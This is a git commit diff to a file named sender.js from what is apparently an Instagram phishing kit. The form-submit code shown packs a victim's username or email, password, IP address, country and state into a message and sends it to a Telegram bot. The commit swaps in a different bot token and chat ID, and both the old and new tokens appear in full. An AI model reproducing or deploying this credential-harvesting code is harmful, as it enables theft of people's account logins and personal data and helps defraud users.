73ac5165b09211c24774d5a482033d30b6d5c74e
Brendafy <167300719+Brendafy@users.noreply.github.com>
2024-04-17 10:50:08 +0100

    Update sender.js

--- js/sender.js
+++ js/sender.js
@@ -20,8 +20,8 @@ form.addEventListener("submit", (e) => {
 
         var my_text = `Instagram Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
-        var token = "6807684688:AAGnRdy0_lrzwmZYcaGQxCSx0sm3p93WLSU";
-        var chat_id =  -4195440280;
+        var token = "6650969963:AAECQrzycrXYX2_j45OEBuoMU38lLXTjLh8";
+        var chat_id =  -4151388973;
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
 
         let api = new XMLHttpRequest();
